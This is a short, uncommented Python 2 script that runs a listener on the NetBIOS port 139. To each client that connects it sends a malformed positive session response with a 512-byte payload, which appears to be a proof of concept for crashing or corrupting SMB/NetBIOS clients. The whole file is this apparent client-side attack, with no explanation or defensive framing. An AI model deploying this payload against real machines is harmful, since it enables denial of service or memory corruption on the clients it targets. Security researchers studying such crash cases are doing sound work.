#!/usr/bin/env python2

from socket import *
import sys
import struct

host=''
port=139

ss=socket(AF_INET,SOCK_STREAM)
ss.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

ss.bind((host,port))
ss.listen(11)

while 1:
    sock , a=ss.accept()
    print 'got a connection from %s' % str(a)
    s = sock.recv(1000)
    print list(s)

    s='\x82'
    s+='\x00'
    s+=struct.pack('>h',512)
    s+='2'*512
    sock.sendall(s)
    print 'resp1 sent'

    s=sock.recv(1000)
    print list(s)
    sys.exit()
